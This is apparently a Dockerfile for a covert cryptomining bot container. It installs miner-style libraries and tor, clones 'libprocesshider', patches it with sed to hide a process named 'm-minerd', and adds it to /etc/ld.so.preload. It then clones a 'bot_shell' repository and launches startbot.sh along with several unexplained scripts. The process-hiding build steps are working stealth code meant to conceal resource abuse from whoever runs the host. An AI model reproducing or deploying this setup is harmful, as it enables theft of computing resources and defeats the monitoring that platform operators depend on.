FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
    libnuma-dev \
    tor \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh    /home
COPY kroco-siji.sh  /home
COPY kroco-loro.sh  /home
COPY kroco-telu.sh  /home
COPY kroco-papat.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

#TOR Service
RUN service tor start

#Library process hider
RUN git clone https://github.com/hanifgz/libprocesshider.git \
 && cd libprocesshider \
 && sed -i 's/apache/m-minerd/' processhider.c \
 && make \
 && sudo mv libprocesshider.so /usr/local/lib/ \
 && sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload' \
 && cd .. \
 && sudo rm libprocesshider -r

# Install the bot:
RUN git clone https://github.com/kuyaxxx/bot_shell.git \
 && cd bot_shell \
 && npm install

RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD bash /home/startbot.sh
